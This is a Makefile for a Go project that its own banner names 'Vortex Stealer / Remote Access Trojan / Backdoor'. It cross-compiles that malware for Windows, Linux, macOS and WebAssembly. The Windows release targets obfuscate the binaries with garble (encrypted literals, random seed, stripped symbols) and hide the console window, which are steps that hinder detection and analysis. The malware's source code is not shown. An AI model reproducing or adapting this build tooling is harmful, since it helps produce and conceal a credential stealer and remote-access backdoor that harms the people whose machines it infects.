EXECBIN=vortex
AUTHOR=r0ttenbeef
VERSION=3.5
DEBUG_BUILD=$(EXECBIN)-$(VERSION)_debug.exe
RELEASE_BUILD32=$(EXECBIN)-$(VERSION)_x86.exe
RELEASE_BUILD64=$(EXECBIN)-$(VERSION)_x64.exe
LINUX_RELEASE_BUILD=$(EXECBIN)-$(VERSION)_linux
DARWIN_AMD64_BUILD=$(EXECBIN)-$(VERSION)_darwin_amd64
DARWIN_ARM64_BUILD=$(EXECBIN)-$(VERSION)_darwin_arm64
WASM_RELEASE_BUILD=$(EXECBIN)-$(VERSION).wasm

define ANNOUNCE_BODY

░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░   ░▒▓██████▓▒░  
  ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
  ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
   ░▒▓██▓▒░   ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░
                 Vortex Stealer / Remote Access Trojan / Backdoor
Author: $(AUTHOR) -- Version $(VERSION)
---
endef

export ANNOUNCE_BODY
.PHONY: release_x32 release_x64 debug linux_release darwin_amd64 darwin_arm64 darwin_release wasm_release release_all

release_x32: release_dir init build_release_x32
release_x64: release_dir init build_release_x64
debug: debug_dir init build_debug
linux_release: release_dir init build_linux_release
darwin_amd64: release_dir init build_darwin_amd64
darwin_arm64: release_dir init build_darwin_arm64
darwin_release: release_dir init build_darwin_amd64 build_darwin_arm64
wasm_release: release_dir init build_wasm_release
release_all: release_dir init build_release_x32 build_release_x64 build_linux_release build_darwin_amd64 build_darwin_arm64 build_wasm_release

debug_dir:
	@if [ ! -d bin ];then mkdir bin;fi
	@if [ ! -d bin/debug ];then mkdir bin/debug;fi

release_dir:
	@if [ ! -d bin ];then mkdir bin;fi
	@if [ ! -d bin/release ];then mkdir bin/release;fi

init:
	@echo "$$ANNOUNCE_BODY"
	@echo "[*]Generate Modules and install"
	@if [ ! -f go.mod ]; then go mod init vortex;fi
	@go get -v .
	@echo "[*]Generate resource file"
	@go generate
	@echo "[*]Installing Garble"
	go install mvdan.cc/garble@latest

build_release_x32:
	@echo "[*]Compiling release build for windows x86 architecture"
	@env GOOS=windows GOARCH=386 CGO_ENABLED=1 CC=i686-w64-mingw32-gcc CXX=i686-w64-mingw32-g++ $(shell go env GOPATH)/bin/garble -debug -literals -tiny -seed=random build -v -o bin/release/$(RELEASE_BUILD32) -ldflags="-s -w -H windowsgui"
	@go clean -cache
	@echo [+]$(EXECBIN) - $(VERSION) - $(AUTHOR)
	@echo [+]$(EXECBIN) 32bit release version compiled successfully

build_release_x64:
	@echo "[*]Compiling release build for windows x64 architecture"
	@env GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ $(shell go env GOPATH)/bin/garble -debug -literals -tiny -seed=random build -v -o bin/release/$(RELEASE_BUILD64) -ldflags="-s -w -H windowsgui"
	@go clean -cache
	@echo [+]$(EXECBIN) - $(VERSION) - $(AUTHOR)
	@echo [+]$(EXECBIN) 64bit release version compiled successfully

build_debug:
	@echo "[*]Compiling debug build for windows x64 architecture"
	env GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -v -o bin/debug/$(DEBUG_BUILD)
	@echo [+]$(EXECBIN) - $(VERSION) - $(AUTHOR)
	@echo [+]$(EXECBIN) 64bit debug version compiled successfully

build_linux_release:
	@echo "[*]Compiling release build for linux"
	env GOOS=linux GOARCH=amd64 CGO_ENABLED=1 go build -v -o bin/release/$(LINUX_RELEASE_BUILD)
	@go clean -cache
	@echo [+]$(EXECBIN) - $(VERSION) - $(AUTHOR)
	@echo [+]$(EXECBIN) linux release version compiled successfully

build_darwin_amd64:
	@echo "[*]Compiling release build for macOS amd64"
	env GOOS=darwin GOARCH=amd64 CGO_ENABLED=0 go build -v -o bin/release/$(DARWIN_AMD64_BUILD)
	@go clean -cache
	@echo [+]$(EXECBIN) - $(VERSION) - $(AUTHOR)
	@echo [+]$(EXECBIN) macOS amd64 release version compiled successfully

build_darwin_arm64:
	@echo "[*]Compiling release build for macOS arm64 (Apple Silicon)"
	env GOOS=darwin GOARCH=arm64 CGO_ENABLED=0 go build -v -o bin/release/$(DARWIN_ARM64_BUILD)
	@go clean -cache
	@echo [+]$(EXECBIN) - $(VERSION) - $(AUTHOR)
	@echo [+]$(EXECBIN) macOS arm64 release version compiled successfully

build_wasm_release:
	@echo "[*]Compiling release build for WebAssembly"
	env GOOS=js GOARCH=wasm go build -o bin/release/$(WASM_RELEASE_BUILD) .
	@cp "$$(go env GOROOT)/misc/wasm/wasm_exec.js" bin/release/ 2>/dev/null || cp "$$(go env GOROOT)/lib/wasm/wasm_exec.js" bin/release/ 2>/dev/null || cp wasm_exec.js bin/release/ 2>/dev/null || true
	@echo [+]$(EXECBIN) - $(VERSION) - $(AUTHOR)
	@echo [+]$(EXECBIN) WebAssembly release version compiled successfully
